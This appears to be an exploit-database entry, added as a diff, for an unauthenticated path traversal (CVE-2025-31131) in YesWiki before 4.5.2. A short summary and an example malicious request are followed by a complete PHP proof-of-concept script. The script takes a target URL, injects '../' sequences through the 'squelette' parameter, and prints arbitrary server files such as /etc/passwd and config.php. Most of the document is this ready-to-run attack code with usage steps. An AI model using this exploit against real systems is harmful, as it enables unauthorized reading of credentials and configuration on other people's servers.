@@ -1,0 +1,106 @@
+=============================================================================================================================================
+| # Title     : YesWiki 4.5.2 Directory Traversal                                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/YesWiki/yeswiki                                                                                          |
+=============================================================================================================================================
+
+[+] Summary : 
+
+ YesWiki versions prior to **4.5.2** are vulnerable to an **unauthenticated path traversal** vulnerability through the `squelette` parameter.  
+ A remote attacker can leverage this flaw to read arbitrary files on the target system,  
+ including sensitive files such as:
+ 
+ /etc/passwd
+ /var/www/html/config.php
+ 
+ 
+This issue can be exploited without authentication.
+
+-------------------------------------------------------------------------------
+
+## 2. Technical Details
+
+The vulnerable parameter is: squelette=
+
+By supplying traversal sequences (`../`) combined with encoded filenames,  
+an attacker can escape the intended directory and access system files.
+
+Example malicious request pattern: /?UrkCEO/edit&theme=margot&squelette=../../../../../../etc/passwd&style=margot.css
+
+The application does not validate or sanitize the `squelette` parameter,  
+resulting in Local File Inclusion (LFI).
+
+[+] References : ( CVE-2025-31131 ) 
+
+1. Save the file as: poc.php
+
+2. Edit the target:
+```php
+$target = "http://TARGET";
+
+3.Execute: php poc.php http://127.0.0.1 /var/www/html/config.php
+
+
+[+]  POC
+
+<?php
+/*
+ * YesWiki < 4.5.2 - Unauthenticated Path Traversal (CVE-2025-31131)
+ * by: Indoushka
+ */
+
+function banner() {
+    echo str_repeat("=", 80) . PHP_EOL;
+    echo " YesWiki < 4.5.2 - Unauthenticated Path Traversal (CVE-2025-31131)" . PHP_EOL;
+    echo " Exploit Author: Al Baradi Joy" . PHP_EOL;
+    echo " PHP Version by: Indoushka" . PHP_EOL;
+    echo str_repeat("=", 80) . PHP_EOL;
+}
+
+function exploit($target, $filename = "/etc/passwd") {
+    if (!preg_match('/^http/', $target)) {
+        $target = "http://" . $target;
+    }
+
+    $traversal = str_repeat("../", 8);
+    $encoded = str_replace("/", "%2f", $filename);
+
+    $payload = "/?UrkCEO/edit&theme=margot&squelette={$traversal}{$encoded}&style=margot.css";
+    $url = rtrim($target, "/") . $payload;
+
+    echo "[+] Target: $target\n";
+    echo "[+] Trying to read: $filename\n";
+
+    $response = @file_get_contents($url);
+
+    if ($response !== false) {
+        if (strpos($response, "root:") !== false || strlen($response) > 50) {
+            echo "[+] Exploit successful! File contents:\n\n";
+            echo $response;
+        } else {
+            echo "[!] Exploit failed. Response too small or file unreadable.\n";
+            echo $response . "\n";
+        }
+    } else {
+        echo "[!] Request failed. Target unreachable.\n";
+    }
+}
+
+banner();
+
+if ($argc < 2) {
+    echo "Usage: php " . $argv[0] . " <target_url> [file_to_read]\n";
+    echo "Example: php " . $argv[0] . " http://victim.com /etc/passwd\n";
+    exit;
+}
+
+$target = $argv[1];
+$file = $argv[2] ?? "/etc/passwd";
+
+exploit($target, $file);
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
